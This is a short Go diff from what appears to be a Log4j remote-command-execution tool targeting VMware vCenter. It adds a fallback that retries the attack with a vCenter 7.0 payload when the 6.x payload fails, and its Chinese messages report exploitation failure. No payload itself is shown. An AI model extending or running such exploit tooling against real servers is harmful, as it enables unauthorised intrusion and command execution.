@@ -117,7 +117,14 @@ func main() {
 					usage()
 					os.Exit(0)
 				} else {
-					log4jcenter.Exec_cmd(url, rmi, command)
+					if log4jcenter.Exec_cmd(url, rmi, command, "6") {
+						//
+					} else {
+						fmt.Println("[-] Vcenter 6.X paylaod 利用失败，尝试7.0")
+						if !log4jcenter.Exec_cmd(url, rmi, command, "7") {
+							fmt.Println("[-] 回显失败，目标不存在漏洞或其他原因.")
+						}
+					}
 				}
 
 			} else {
